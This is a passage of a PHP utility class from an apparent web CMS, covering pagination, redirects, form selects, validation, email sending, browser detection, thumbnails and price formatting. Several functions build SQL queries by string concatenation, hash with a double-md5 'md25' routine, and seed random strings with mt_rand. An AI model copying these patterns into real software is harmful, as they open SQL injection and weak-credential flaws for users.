			$numpage = $cPage + 1;
			$pLink = $root_link . "/?{$p}=" . $numpage . "{$extra}";
			$navigation .= "&nbsp;<a href='" . $pLink . "' class='btnPage next'>&nbsp;</a>";
		  }
		  // End		
		  // Show Last page
		  if ($cPage < ($totalPages - $pmore))
		  {
			$pLink = $root_link . "/?{$p}=" . $totalPages . "{$extra}";
			$navigation .= "&nbsp;<a href='" . $pLink . "' class='btnPage last' >&nbsp;</a>";
		  }
		  // End
		} // end if total pages is greater than one
		return $navigation;
	}
	
	/*--------------- html_redirect  -----------*/
	function html_redirect ($url, $mess, $time_ref = 1)
	{
		global $ttH;
		$data['url'] = $url;
		$data['mess'] = $mess;
		$data['mess_redirect'] = "<a href='{$url}'>" . $ttH->lang['mess_redirect'] . "</a>";
		$data['host_name'] = $_SERVER['HTTP_HOST'];
		$data['time_ref'] = $time_ref;
		flush();
		echo $ttH->box->box_redirect($data);
		exit();
	}
	
	/*------------------------------------*/
	function html_err ($err)
	{
		global $ttH;
		return '<div id="boxMess">
							<h4 class="err">' . $ttH->lang["global"]['error'] . ':</h4>
							<p class="font_err">' . $err . '</p>
						  </div><br class="clear">';
	}
	
	function html_mess ($mess)
	{
		global $ttH;
		return '<div class="alert alert-info alert-dismissable">
		  <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
		  ' . $mess . '
			</div>';
	}
	
	//-----------------add_css
	function add_css ($file = "")
	{
		global $ttH;
		$ttH->page_css .= '<link href="'.$file.'" rel="stylesheet" type="text/css" />';		
		return false;    
	}
	
	//-----------------add_script
	function add_script ($file = "")
	{
		global $ttH;
		$ttH->page_js .= '<script type="text/javascript" src="'.$file.'"></script>';		
		return false;    
	}
	
	function md25($str)
	{
		$str = md5($str);
		$str = md5(substr($str,2,7).$str);
		return $str;
	}
	
	function base64_encode($str)
	{
		$str = base64_encode($str);
		return $str;
	}
	
	function base64_decode($str)
	{
		$str = base64_decode($str);
		return $str;
	}
	
	// getHost_URL
	function getHost_URL($Address) {
		 $parseUrl = parse_url(trim($Address));
		 /*echo '<pre>';
		 print_r($parseUrl);
		 echo '</pre>';
		 die();*/
		 $domain = (isset($parseUrl['host'])) ? $parseUrl['host'] : $parseUrl['path'];//array_shift(explode('/', $parseUrl['path'], 2));
		 
		 $tmp = explode(".",$domain);
		 $domain = ($tmp[0] == "www" && count($tmp) > 2) ? substr($domain,4) : $domain;
		 
		 if($domain == "localhost")
		 {
			 $tmp = explode("/",$parseUrl['path']);
			 if(isset($tmp[1]))
				 $domain = $domain."_".$tmp[1];
		 }
		 
		 return $domain;
	}
	
	// get_date_format
	function get_date_format ($date, $type = 1)
	{
		global $ttH;
		$out = "";
		
		switch ($type) {
			case 2:
					$out = @date("d/m/Y, H:i",$date);
			break;
			case 1:
					$out = @date("d/m/Y, H:i",$date);
			break;
			default:
			$out = @date("d/m/Y",$date);
			break;
		}	
		
		return $out;
	}
	
	// get_time_format
	function get_time_format ($number)
	{
		global $ttH;
		$out = "";
		$day = 24*60*60;
		$hour = 60*60;
		$minute = 60;
		
		if($number >= $day)
		{
			$tmp = floor($number / $day);
			$number -= $tmp*$day;
			$out .= '<span>'.$tmp.'</span> '.$ttH->lang["day"];
		}
		
		if($number >= $hour)
		{
			if($out)
				$out .= ', ';
			
			$tmp = floor($number / $hour);
			$number -= $tmp*$hour;
			$out .= '<span>'.$tmp.'</span> '.$ttH->lang["hour"];
		}
		
		if($number >= $minute)
		{
			if($out)
				$out .= ', ';
			
			$tmp = floor($number / $minute);
			$number -= $tmp*$minute;
			$out .= '<span>'.$tmp.'</span> '.$ttH->lang["minute"];
		}
		
		if($out)
			$out .= ', ';
		
		$out .= '<span>'.$number.'</span> '.$ttH->lang["second"];
		
		return $out;
	}
	
	//=================list_yes_no===============
	function list_yes_no ($select_name="statistic", $cur = "", $ext="")
	{
		global $ttH;
		
		$arr_view = array(
			0 => $ttH->lang["no"],
			1 => $ttH->lang["yes"]
		);
		
		$text = "<select size=1 name=\"".$select_name."\" id=\"".$select_name."\" ".$ext.">";
		foreach($arr_view as $key => $value)
		{
			$selected = ($key == $cur) ? " selected='selected'" : "";
			$text .= "<option value=\"".$key ."\" ".$selected."> " . $value . " </option>";
		}
		$text .= "</select>";
		
		return $text;
	}
	
	//=================list_on_off===============
	function list_on_off ($select_name="statistic", $cur = "", $ext="")
	{
		global $ttH;
		
		$arr_view = array(
			0 => $ttH->lang["off"],
			1 => $ttH->lang["on"]
		);
		
		$text = "<select size=1 name=\"".$select_name."\" id=\"".$select_name."\" ".$ext.">";
		foreach($arr_view as $key => $value)
		{
			$selected = ($key == $cur) ? " selected='selected'" : "";
			$text .= "<option value=\"".$key ."\" ".$selected."> " . $value . " </option>";
		}
		$text .= "</select>";
		
		return $text;
	}
	
	//=================get_select===============
	function get_select ($select_name="id", $array=array(), $cur="", $ext="",$arr_more=array())
	{
		global $ttH;
		
		$text = "<select size=1 name=\"".$select_name."\" id=\"".$select_name."\" ".$ext.">";
		
		if(isset($arr_more["title"]))
			$text .= "<option value=\"\"> " . $arr_more["title"] . " </option>";
		
		foreach($array as $key => $value)
		{
			$selected = ($key == $cur) ? " selected='selected'" : "";
			$text .= "<option value=\"".$key ."\" ".$selected."> " . $value . " </option>";
		}
		$text .= "</select>";
		
		return $text;
	}
	
	//=================is_email===============
	function check_username_right ($username)
	{
		global $ttH;
		
		$ok = 0;
		if (!preg_match("/(.*)[^a-z0-9\s.](.*)/",$username) && !strstr($username," ")) {
		$ok = 1;
	}
		
		return $ok;
	}
	
	//=================is_email===============
	function is_email ($email)
	{
		global $ttH;
		
		$ok = 0;
		if(filter_var($email, FILTER_VALIDATE_EMAIL)) {
		$ok = 1;
	}
		
		return $ok;
	}
	
	//=================is_url===============
	function is_url ($url)
	{
		global $ttH;
		
		$ok = 0;
		if(preg_match('|^http(s)?://[a-z0-9+\$_-]+(\.[a-z0-9+\$_-]+)+(:[0-9]+)?(/.*)?$|i', $url)) {
		$ok = 1;
	}
		
		return $ok;
	}
	
	// random_str
	function random_str ($len = 5, $type='')
	{
		$u = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$l = 'abcdefghijklmnopqrstuvwxyz';
		$n = '0123456789';
		$s = $u.$l.$n;
		switch ($type) {
			case 'n':
				$s = $n;
				break;
			case 'l':
				$s = $l;
				break;
			case 'u':
				$s = $u;
				break;
			case 'un':
				$s = $u.$n;
				break;
			case 'ul':
				$s = $u.$l;
				break;
			case 'ln':
				$s = $l.$n;
				break;
		};
		
		mt_srand((double) microtime() * 1000000);
		$unique_id = '';
		for ($i = 0; $i < $len; $i ++)
		{
			$unique_id .= substr($s, (mt_rand() % (strlen($s))), 1);
		}
			
		return $unique_id;
	}
	
	/*--------------- send_mail`  -----------*/
	function send_mail ($mailto, $subject, $message, $mailfrom, $file_attach = ""){
		global $ttH;
		
		$message = stripcslashes ($message);
		
		$from_name = $_SERVER['HTTP_HOST'];
		
		$ttH->mailer = new PHPMailer();
		
		$ttH->mailer->IsSMTP(); // telling the class to use SMTP
		//$ttH->mailer->SMTPDebug  = 2;                     // enables SMTP debug information (for testing)
																							 // 1 = errors and messages
																							 // 2 = messages only
		$ttH->mailer->SMTPAuth   = true;                  // enable SMTP authentication
		$ttH->mailer->CharSet = "utf-8";
		switch ($ttH->conf['method_email'])
		{
			case "gmail":
			$ttH->mailer->SMTPSecure = "ssl";                 // sets the prefix to the servier
			$ttH->mailer->Host       = $ttH->conf['smtp_host'];      // sets GMAIL as the SMTP server
			$ttH->mailer->Port       = $ttH->conf['smtp_port'];                   // set the SMTP port for the GMAIL server
			$ttH->mailer->Username   = $ttH->conf['smtp_username'];  // GMAIL username
			$ttH->mailer->Password   = $ttH->conf['smtp_password'];            // GMAIL password
			break;
			case "smtp":
			$ttH->mailer->Host = $ttH->conf['smtp_host'];
			$ttH->mailer->Port = $ttH->conf['smtp_port'];
			$ttH->mailer->Mailer = "smtp";
			$ttH->mailer->Username = $ttH->conf['smtp_username'];
			$ttH->mailer->Password = $ttH->conf['smtp_password']; // Password E-mail
			break;
			default:
			$ttH->mailer->Mailer = "mail";
			break;
		}
		
		$ttH->mailer->SetFrom($mailfrom, $from_name);
		$ttH->mailer->AddReplyTo($mailto, $mailto);
		
		$ttH->mailer->Subject    = $subject;
		
		$ttH->mailer->AltBody    = $message; // optional, comment out and test
		
		$ttH->mailer->MsgHTML($message);
		
		$arrTo = explode(",", $mailto);
		for ($i = 0; $i < count($arrTo); $i ++)
		{
			if ($i == 0) $ttH->mailer->AddAddress($arrTo[$i], $_SERVER['HTTP_HOST']);
			else
			$ttH->mailer->AddCC($arrTo[$i], $_SERVER['HTTP_HOST']);
		}
		
		if (! empty($file_attach))
		{
				if(is_array($file_attach))
				{
					foreach ($file_attach as $file_a){
						$ttH->mailer->AddAttachment($file_a);	
					}      
				}else{
					$ttH->mailer->AddAttachment($file_attach);		
				}
		}
		
		/*if(!$ttH->mailer->Send()) {
			echo "Mailer Error: " . $ttH->mailer->ErrorInfo;
		} else {
			echo "Message sent!";
		}*/
		
		$sent = $ttH->mailer->Send();
		return $sent;
	}
	
	// send_mail_temp
	function send_mail_temp ($template, $mailto, $mailfrom, $arr_key=array(), $arr_value=array(), $file_attach = "")
	{
		global $ttH;
		
		$sent = 0;
		
		$sql = "select * from template_email where template_id='".$template."' and lang='".$ttH->conf['lang_cur']."' limit 0,1";
    $result = $ttH->db->query($sql);
    if ($row = $ttH->db->fetch_row($result)){
			
			$row['subject'] = str_replace($arr_key,$arr_value,$row['subject']);
			
			$row['content'] = $this->input_editor_decode($row['content']);
			$row['content'] = str_replace($arr_key,$arr_value,$row['content']);
			$sent = $this->send_mail($mailto, $row['subject'], $row['content'], $mailfrom, $file_attach);
		}
	
		return $sent;
	}
	
	// Strat func
	function getBrowser ($browser)
	{
	if ($browser)
	{
	  if (strpos($browser, "Mozilla/5.0")) $browsertyp = "Mozilla";
	  if (strpos($browser, "Mozilla/4")) $browsertyp = "Netscape";
	  if (strpos($browser, "Mozilla/3")) $browsertyp = "Netscape";
	  if (strpos($browser, "Firefox") || strpos($browser, "Firebird")) $browsertyp = "Firefox";
	  if (strpos($browser, "MSIE")) $browsertyp = "Internet Explorer";
	  if (strpos($browser, "Opera")) $browsertyp = "Opera";
			if (strpos($browser, "Opera Mini")) $browsertyp = "Opera Mini";			
	  if (strpos($browser, "Netscape")) $browsertyp = "Netscape";
	  if (strpos($browser, "Camino")) $browsertyp = "Camino";
	  if (strpos($browser, "Galeon")) $browsertyp = "Galeon";
	  if (strpos($browser, "Konqueror")) $browsertyp = "Konqueror";
	  if (strpos($browser, "Safari")) $browsertyp = "Safari";
	  if (strpos($browser, "Chrome")) $browsertyp = "Chrome";
	  if (strpos($browser, "OmniWeb")) $browsertyp = "OmniWeb";
	  if (strpos($browser, "Flock")) $browsertyp = "Firefox Flock";
	  if (strpos($browser, "Lynx")) $browsertyp = "Lynx";
	  if (strpos($browser, "Mosaic")) $browsertyp = "Mosaic";
			if (strpos($browser, "Shiretoko")) $browsertyp = "Shiretoko";
			if (strpos($browser, "IceCat")) $browsertyp = "IceCat";			
			if (strpos($browser, "BlackBerry")) $browsertyp = "BlackBerry";			
	  if (strpos($browser, "Googlebot") || strpos($browser, "www.google.com")) $browsertyp = "Google Bot";
			if (strpos($browser, "Yahoo")) $browsertyp = "Yahoo Bot";
	  if (! isset($browsertyp)) $browsertyp = "UnKnown";
	}
	
	return $browsertyp;
	}
	
	// Strat func
	function getOs ($os){
	if ($os){
	  if (strpos($os, "Win95") || strpos($os, "Windows 95")) $ostyp = "Windows 95";
	  if (strpos($os, "Win98") || strpos($os, "Windows 98")) $ostyp = "Windows 98";
	  if (strpos($os, "WinNT") || strpos($os, "Windows NT")) $ostyps = "Windows NT";
	  if (strpos($os, "WinNT 5.0") || strpos($os, "Windows NT 5.0")) $ostyp = "Windows 2000";
	  if (strpos($os, "WinNT 5.1") || strpos($os, "Windows NT 5.1")) $ostyp = "Windows XP";
	  if (strpos($os, "WinNT 6.0") || strpos($os, "Windows NT 6.0")) $ostyp = "Windows Vista";
			if (strpos($os, "WinNT 6.1") || strpos($os, "Windows NT 6.1")) $ostyp = "Windows 7";
			if (strpos($os, "WinNT 6.2") || strpos($os, "Windows NT 6.2")) $ostyp = "Windows 8";
	  if (strpos($os, "Linux")) $ostyp = "Linux";
	  if (strpos($os, "OS/2")) $ostyp = "OS/2";
	  if (strpos($os, "Sun")) $ostyp = "Sun OS";
			if (strpos($os, "iPod")) $ostyp = "iPodTouch";
			if (strpos($os, "iPhone")) $ostyp = "iPhone";
			if (strpos($os, "iPad")) $ostyp = "iPad";
			if (strpos($os, "Android")) $ostyp = "Android";			
			if (strpos($os, "Windows Phone")) $ostyp = "Windows Phone";						
	  if (strpos($os, "Macintosh") || strpos($os, "Mac_PowerPC")) $ostyp = "Mac OS";
	  if (strpos($os, "Googlebot") || strpos($os, "www.google.com")) $ostyp = "Google Bot";
	  
	  if (! isset($ostyp)) $ostyp = "UnKnown";
	}
	return $ostyp;
	}
	
	//--------------
  function get_link ($link, $link_type)
  {
		global $ttH;	
		
		$output = '';
    switch ($link_type) {
			case "web":
				$output = $link;
				break;
			case "mail":
				$output = 'mailto:'.$link;
				break;
			case "neo":
				$output = '#'.$link;
				break;
			default:
				$output = $ttH->conf["rooturl"].$link;
				break;
		}
		return $output;
  }
	
	function hex2rgb($hexStr, $returnAsString = false, $seperator = ',') {
    $hexStr = preg_replace("/[^0-9A-Fa-f]/", '', $hexStr); // Gets a proper hex string
    $rgbArray = array();
    if (strlen($hexStr) == 6) { //If a proper hex code, convert using bitwise operation. No overhead... faster
			$colorVal = hexdec($hexStr);
			$rgbArray['red'] = 0xFF & ($colorVal >> 0x10);
			$rgbArray['green'] = 0xFF & ($colorVal >> 0x8);
			$rgbArray['blue'] = 0xFF & $colorVal;
    } elseif (strlen($hexStr) == 3) { //if shorthand notation, need some string manipulations
			$rgbArray['red'] = hexdec(str_repeat(substr($hexStr, 0, 1), 2));
			$rgbArray['green'] = hexdec(str_repeat(substr($hexStr, 1, 1), 2));
			$rgbArray['blue'] = hexdec(str_repeat(substr($hexStr, 2, 1), 2));
    } else {
			return false; //Invalid hex color code
    }
    return $returnAsString ? implode($seperator, $rgbArray) : $rgbArray; // returns the rgb string or the associative array
	}
	
	/*
	* RGB-Colorcodes(i.e: 255 0 255) to HEX-Colorcodes (i.e: FF00FF)
	*/
	function rgb2hex($rgb){
			if(!is_array($rgb) || count($rgb) != 3){
					echo "Argument must be an array with 3 integer elements";
					return false;
			}
			for($i=0;$i<count($rgb);$i++){
					if(strlen($hex[$i] = dechex($rgb[$i])) == 1){
							$hex[$i] = "0".$hex[$i];
					}
			}
			return implode('',$hex);
	}
	
	function location_name($type='area', $code=''){
		global $ttH;
		
		$data = $ttH->load_data->data_table ('location_'.$type, 'code', 'code,title', "is_show=1 and lang='".$ttH->conf['lang_cur']."' and code='".$code."' limit 0,1");
		
		return $this->if_isset($data[$code]['title'],$code);		
	}
	
	function full_address($info=array(), $pre=''){
		$arr_tmp = array();
		if(isset($info[$pre.'address'])) {
			$arr_tmp[] = $info[$pre.'address'];
		}
		
		$arr_k = array('ward','district','province','country','area');
		foreach($arr_k as $k) {
			if(isset($info[$pre.$k]) && !empty($info[$pre.$k])) {
				$arr_tmp[] = $this->location_name($k, $info[$pre.$k]);
			}
		}
		
		return (count($arr_tmp) > 0) ? implode(', ',$arr_tmp) : '';
	}
	
	/**
	 * thumbs
	 *
	 * @params  string  
	 * @params  string   
	 *
	 * @return
	 */
	 function thumbs ($imgfile = "", $path, $maxWidth, $maxHeight="",$crop=0, $arr_more=array())
   {
		
		if($maxHeight==""){
			$maxHeight = $maxWidth;
		}
		
    $info = @getimagesize($imgfile);
    $mime = $info[2];
    $fext = ($mime == 1 ? 'image/gif' : ($mime == 2 ? 'image/jpeg' : ($mime == 3 ? 'image/png' : NULL)));
    switch ($fext)
    {
      case 'image/jpeg':
        if (! function_exists('imagecreatefromjpeg'))
        {
          die('No create from JPEG support');
        } else
        {
          $img['src'] = @imagecreatefromjpeg($imgfile);
        }
        break;
      case 'image/png':
        if (! function_exists('imagecreatefrompng'))
        {
          die("No create from PNG support");
        } else
        {
          $img['src'] = @imagecreatefrompng($imgfile);
        }
        break;
      case 'image/gif':
        if (! function_exists('imagecreatefromgif'))
        {
          die("No create from GIF support");
        } else
        {
          $img['src'] = @imagecreatefromgif($imgfile);
        }
        break;
    }
    $img['old_w'] = @imagesx($img['src']);
    $img['old_h'] = @imagesy($img['src']);
      
		if($crop == 1){
			// Ratio cropping
			$offsetX	= 0;
			$offsetY	= 0; 
			
			$new_w	= $maxWidth;
			$new_h	= $maxHeight;
			
			 
			$cropRatio = array($maxWidth, $maxHeight);
			if (count($cropRatio) == 2)
			{
				$ratioComputed		=  $img['old_w'] /  $img['old_h'];
				$cropRatioComputed	= (float) $cropRatio[0] / (float) $cropRatio[1];
				$ratio = max($maxWidth/$img['old_w'], $maxHeight/$img['old_h']);		
				
				$img_tmp = $img;
				
				if ($ratioComputed < $cropRatioComputed)
				{ // Image is too tall so we will crop the top and bottom
					//$img['old_w'] = $img['old_w'];
					$img['old_h'] = $img['old_w'] / $cropRatioComputed;
					$offsetY = ($img_tmp['old_h'] - $maxHeight / $ratio) / 2;
				}
				else if ($ratioComputed > $cropRatioComputed)
				{ // Image is too wide so we will crop off the left and right sides		
					//$img['old_h'] = $img['old_h'];
					$img['old_w'] = $img['old_h'] * $cropRatioComputed;
					$offsetX = ($img_tmp['old_w'] - $maxWidth / $ratio) / 2;
				}
			}

		}else{
			$new_h = $img['old_h'];
   	  $new_w = $img['old_w'];
			$offsetX=0;
			$offsetY = 0 ;
			$tl_old = $img['old_w']/$img['old_h'] ;
			$tl_new = 1 ;
			if($maxHeight != 'auto') {
				$tl_new = $maxWidth/$maxHeight ;
			}
			
			if(isset($arr_more["fix_width"]))	{
				$new_w = $maxWidth;
				$new_h = ($maxWidth / $img['old_w']) * $img['old_h'];
			}
			elseif(isset($arr_more["fix_height"]))	{
				$new_h = $maxHeight;
				$new_w = ($maxHeight / $img['old_h']) * $img['old_w'];
			}
			elseif(isset($arr_more["fix_min"]))	{
				if ($img['old_w'] > $img['old_h'])
				{
					$new_h = $maxHeight;
					$new_w = ($maxHeight / $img['old_h']) * $img['old_w'];
					
					if($new_w < $maxWidth)
					{
						$new_w = $maxWidth;
						$new_h = ($maxWidth / $img['old_w']) * $img['old_h'];
					}
				}
				else
				{
					$new_w = $maxWidth;
					$new_h = ($maxWidth / $img['old_w']) * $img['old_h'];
					
					if($new_h < $maxHeight)
					{
						$new_h = $maxHeight;
						$new_w = ($maxHeight / $img['old_h']) * $img['old_w'];
					}
				}
			}
			elseif(isset($arr_more["zoom_max"]))	{
				if ($tl_new > $tl_old)
				{
					$new_h = $maxHeight;
					$new_w = ($maxHeight / $img['old_h']) * $img['old_w'];
				}
				else
				{
					$new_w = $maxWidth;
					$new_h = ($maxWidth / $img['old_w']) * $img['old_h'];
				}
			}
			else
			{
				if ($img['old_w'] > $maxWidth)
				{
					$new_w = $maxWidth;
					$new_h = ($maxWidth / $img['old_w']) * $img['old_h'];
				}
				if ($new_h > $maxHeight && $maxHeight != "auto")
				{
					$new_h = $maxHeight;
					$new_w = ($new_h / $img['old_h']) * $img['old_w'];
				}
			}
		}
		
    $img['des'] = @imagecreatetruecolor($new_w, $new_h); 
		if($fext=="image/png"){
			@imagealphablending($img['des'], false ); 
			@imagesavealpha($img['des'], true);  
		}else{
			$white = @imagecolorallocate($img['des'], 255, 255, 255);
			@imagefill($img['des'], 1, 1, $white);
		}		 
    @imagecopyresampled($img['des'], $img['src'], 0, 0, $offsetX, $offsetY, $new_w, $new_h, $img['old_w'], $img['old_h']);
    //	print "path = ".$path."<br>";	
		@touch($path);
    switch ($fext)
    {
      case 'image/pjpeg':
      case 'image/jpeg':
      case 'image/jpg':
        //@imagejpeg($img['des'], $path, 90);
				@imagejpeg($img['des'], $path, 100);
        break;
      case 'image/png':
        @imagepng($img['des'], $path);
        break;
      case 'image/gif':
        //@imagegif($img['des'], $path, 90);
        @imagegif($img['des'], $path, 100);
        break;
    }
    // Finally, we destroy the images in memory.
    @imagedestroy($img['des']);
  }
	
	/*-------------- get_src_mod --------------------*/
	function get_src_mod ($picture, $w = "", $h = "",$thumb=1 ,$crop=0, $arr_more=array())
	{
		global $ttH;	
		
		$arr_duoi = array('gif','png','jpg');
		
		$duoi = strtolower(substr($picture, strrpos($picture, ".") + 1));
		if(!in_array($duoi,$arr_duoi)){
			$picture = 'nophoto/nophoto.jpg';
		}
		
		$out = "";	 
		$pre = $w ;
		if($h)	{
			$pre = $w."x".$h ;
		}else{
			$h = $w;
		}
		if(isset($arr_more['fix_min'])) {
			$pre .= "_fmin" ;
		}
		if(isset($arr_more['fix_max'])) {
			$pre .= "_fmax" ;
		}
		if(isset($arr_more['fix_width'])) {
			$pre .= "_fw" ;
		}
		if(isset($arr_more['fix_height'])) {
			$pre .= "_fh" ;
		}
		if(isset($arr_more['zoom_max'])) {
			$pre .= "_zmax" ;
		}
		if($crop != 0) {
			$pre .= "_crop" ;
		}
		 
		$linkhinh = $picture;
		$linkhinh = str_replace("//","/",$linkhinh);
		if(!file_exists($ttH->conf['rootpath_web'] ."uploads/". $linkhinh)) {
			$linkhinh = 'nophoto/nophoto.jpg';
		}
		$dir = substr($linkhinh,0,strrpos($linkhinh,"/"));
		$pic_name = substr($linkhinh,strrpos($linkhinh,"/")+1) ;
		$linkhinh = "uploads/".$linkhinh;
			
		if ($w)  
		{		 
		  if($thumb){
				$folder_thumbs = $dir . "/".substr($pic_name, 0, strrpos($pic_name, "."));
				$folder_thumbs .= '_'.substr($pic_name, strrpos($pic_name, ".") + 1);
				$file_thumbs = $folder_thumbs."/{$pre}_" . substr($linkhinh, strrpos($linkhinh, "/") + 1);
				$linkhinhthumbs = $ttH->conf['rootpath'] ."thumbs_size/". $file_thumbs;
				if (! file_exists($linkhinhthumbs)) {
					$this->rmkdir($folder_thumbs, 0777, "thumbs_size");
					// thum hinh
					$ttH->func->thumbs($ttH->conf['rootpath'] . $linkhinh, $linkhinhthumbs, $w, $h, $crop, $arr_more);
				}
				$src =  $ttH->conf['rooturl'] .'thumbs_size/'. $file_thumbs; 
			}else{
				$src = $ttH->conf['rooturl'] . $folder_thumbs ."/".$pic_name;	
			}
 					
		} else {
			$src = $ttH->conf['rooturl'] . 'uploads/' . $picture;    
		}
		 
		return $src;
	}
	
	/*-------------- get_pic_mod --------------------*/
	function get_pic_mod ($picture, $w = "", $h = "", $ext="",$thumb=1 ,$crop=0, $arr_more=array())
	{
		global $ttH;	
		
		$src = $this->get_src_mod ($picture, $w, $h,$thumb,$crop, $arr_more);
		
		//$alt = substr($pic_name, 0, strrpos($pic_name, "."));
		$out = "<img  src=\"{$src}\"  {$ext} >";
		return $out;
	}
	
	//--------------
  function format_size ($rawSize)
  {
    if ($rawSize / 1048576 > 1) {
			return round($rawSize / 1048576, 1) . ' MB';
		} else { 
      if ($rawSize / 1024 > 1) {
				return round($rawSize / 1024, 1) . ' KB';
			} else {
        return round($rawSize, 1) . ' Bytes';
			}
		}
  }
  
  /**
   * @function : format_number  
   * @param 		: $num -> chuoi so
   *							$seperator-> dau phan cach		 
   * @return		: chuoi so
   */
  function format_number ($num, $seperator = ",")
  {
    $string = strrev(substr(chunk_split(strrev($num), 3, $seperator), 0, - 1));
    return $string;
  }
		
	 
	/*-------------- get_price_format --------------------*/
	function get_price_format ($price, $default="", $unit="đ" ,$rate =0){
		global $ttH;
		if(strlen($default) == 0) {
			$default = $ttH->lang["global"]["price_empty"];
		} elseif($default == 0) {
			//$default = "<span class=\"price_format\"><span class=\"unit\">".$unit."</span><span class=\"number\">".$default ."</span></span>";
			$default = "<span class=\"price_format\"><span class=\"number\" data-value=\"0\">".$default ."</span></span>";
		}
		
		if ($price){
			
			return "<span class=\"price_format\"><span class=\"number autoUpdate\" data-value=\"".$price."\">".$price."</span></span>";
		
			if($rate){
				$price = $price / $rate; 
			}
		
			$nguyen = (int) $price;
			$dot =strpos($price,".");
			if ($dot) {
				$du = substr ($price,strpos($price,"."),3);
			} else {
				$du = "";	
			}
			
			$price = "<span class=\"price_format\"><span class=\"unit\">".$unit."</span><span class=\"number autoUpdate\">".$this->format_number($nguyen).$du."</span></span>";
		}else{
			$price = $default;
		}
		return $price;
	}
		
	 
	/*-------------- get_price_format_email --------------------*/
	function get_price_format_email ($price, $default="", $unit="đ" ,$rate =0){
		global $ttH;
		
		if(strlen($default) == 0) {
			$default = $ttH->lang["global"]["price_empty"];
		} elseif($default == 0) {
			$default = "<span class=\"price_format\"><span class=\"number\">".$default ."</span> <span class=\"unit\">".$unit."</span></span>";
		}
		
		if ($price){
		
			if($rate){
				$price = $price / $rate; 
			}
		
			$nguyen = (int) $price;
			$dot =strpos($price,".");
			if ($dot) {
				$du = substr ($price,strpos($price,"."),3);
			} else {
				$du = "";	
			}
			$price = "<span class=\"price_format\"><span class=\"number autoUpdate\">".$this->format_number($nguyen).$du."</span> <span class=\"unit\">".$unit."</span></span>";
		}else{
			$price = $default;
		}
		return $price;
	}
  
// end classs
}
?>